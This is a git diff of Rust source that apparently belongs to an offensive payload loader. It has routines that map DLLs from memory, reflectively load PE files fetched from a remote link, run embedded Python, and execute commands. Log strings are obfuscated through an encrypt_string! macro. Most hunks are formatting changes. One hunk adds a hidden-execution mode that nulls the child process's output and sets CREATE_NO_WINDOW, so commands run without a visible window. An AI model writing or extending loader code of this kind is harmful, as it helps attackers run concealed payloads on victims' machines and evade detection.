@@ -17,10 +17,9 @@ type DllEntryPoint = extern "C" fn() -> c_int;
 #[cfg(target_os = "windows")]
 use crate::python_embedder;
 #[cfg(target_os = "windows")]
-use std::mem;
-#[cfg(target_os = "windows")]
 use rspe::reflective_loader;
-
+#[cfg(target_os = "windows")]
+use std::mem;
 
 use anyhow::Result;
 use serde::{Deserialize, Serialize};
@@ -114,7 +113,6 @@ impl Payload {
             Payload::ReflectivePEFromMemory(payload) => payload.runonce,
         }
     }
-
 }
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
@@ -157,10 +155,10 @@ impl DllFromMemory {
                 let result = dll_entry_point();
                 debug!("{}{}", encrypt_string!("DLL result = "), result);
             });
-                return Ok(PayloadExecThread::Thread(
-                    dllthread,
-                    Payload::DllFromMemory(self.clone()),
-                ));
+            return Ok(PayloadExecThread::Thread(
+                dllthread,
+                Payload::DllFromMemory(self.clone()),
+            ));
         } else {
             let dll_data: &[u8] = &data;
             info!("{}", encrypt_string!("Map DLL in memory"));
@@ -215,7 +213,10 @@ impl ExecPython {
             let tj: thread::JoinHandle<()> = thread::spawn(move || {
                 python_embedder::embedder(&thread_python_path, &thread_python_code);
             });
-            return Ok(PayloadExecThread::Thread(tj, Payload::ExecPython(self.clone())));
+            return Ok(PayloadExecThread::Thread(
+                tj,
+                Payload::ExecPython(self.clone()),
+            ));
         } else {
             python_embedder::embedder(&path, &self.python_code);
             return Ok(PayloadExecThread::NoThread());
@@ -324,7 +325,9 @@ pub struct Exec {
     pub cmdline: String,
     pub thread: bool,
     pub runonce: bool,
+    pub visible: bool,
 }
+/*
 impl Exec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
     pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
@@ -355,7 +358,62 @@ impl Exec {
         };
     }
 }
+*/
 
+#[cfg(target_os = "windows")]
+use std::os::windows::process::CommandExt;
+use std::process::Stdio;
+#[cfg(target_os = "windows")]
+const CREATE_NO_WINDOW: u32 = 0x08000000;
+
+impl Exec {
+    // https://doc.rust-lang.org/std/process/struct.Command.html
+    pub fn exec_file(&self) -> Result<PayloadExecThread, anyhow::Error> {
+        let path: PathBuf = calculate_path(&self.path)?;
+        info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
+        let mut comm = Command::new(&path);
+
+        #[cfg(target_os = "linux")]
+        set_permission(&path);
+
+        for i in self.cmdline.trim().split_whitespace() {
+            comm.arg(i);
+        }
+        if self.thread {
+            let thread_visible = self.visible;
+            let tj: thread::JoinHandle<()> = thread::spawn(move || {
+                if thread_visible {
+                    let _output = comm.spawn().expect("Failed to execute process");
+                } else {
+                    comm.stdin(Stdio::null())
+                        .stdout(Stdio::null())
+                        .stderr(Stdio::null());
+
+                    #[cfg(target_os = "windows")]
+                    comm.creation_flags(CREATE_NO_WINDOW); // Cache la fenêtre sous Windows
+
+                    let _output = comm.output().expect("Failed to execute process");
+                };
+            });
+            return Ok(PayloadExecThread::Thread(tj, Payload::Exec(self.clone())));
+        } else {
+            if self.visible {
+                let _output = comm.spawn().expect("Failed to execute process");
+            } else {
+                comm.stdin(Stdio::null())
+                    .stdout(Stdio::null())
+                    .stderr(Stdio::null());
+
+                #[cfg(target_os = "windows")]
+                comm.creation_flags(CREATE_NO_WINDOW); // Cache la fenêtre sous Windows
+
+                let _output = comm.output().expect("Failed to execute process");
+            };
+            //let _hello: Vec<u8> = output.stdout;
+            return Ok(PayloadExecThread::NoThread());
+        };
+    }
+}
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct ReflectivePEFromMemory {
@@ -366,13 +424,19 @@ pub struct ReflectivePEFromMemory {
 
 impl ReflectivePEFromMemory {
     #[cfg(target_os = "linux")]
-    pub fn reflective_pe_from_memory(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+    pub fn reflective_pe_from_memory(
+        &self,
+        _config: &Config,
+    ) -> Result<PayloadExecThread, anyhow::Error> {
         fail_linux_message(format!("{}", encrypt_string!("ReflectivePEFromMemory")));
         Ok(PayloadExecThread::NoThread())
     }
 
     #[cfg(target_os = "windows")]
-    pub fn reflective_pe_from_memory(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+    pub fn reflective_pe_from_memory(
+        &self,
+        config: &Config,
+    ) -> Result<PayloadExecThread, anyhow::Error> {
         let data: Vec<u8> = self.link.fetch_data(config)?;
 
         if self.thread {
@@ -383,8 +447,8 @@ impl ReflectivePEFromMemory {
                 };
             });
             return Ok(PayloadExecThread::Thread(
-                    thread,
-                    Payload::ReflectivePEFromMemory(self.clone()),
+                thread,
+                Payload::ReflectivePEFromMemory(self.clone()),
             ));
         } else {
             info!("{}", encrypt_string!("ReflectivePEFromMemory"));
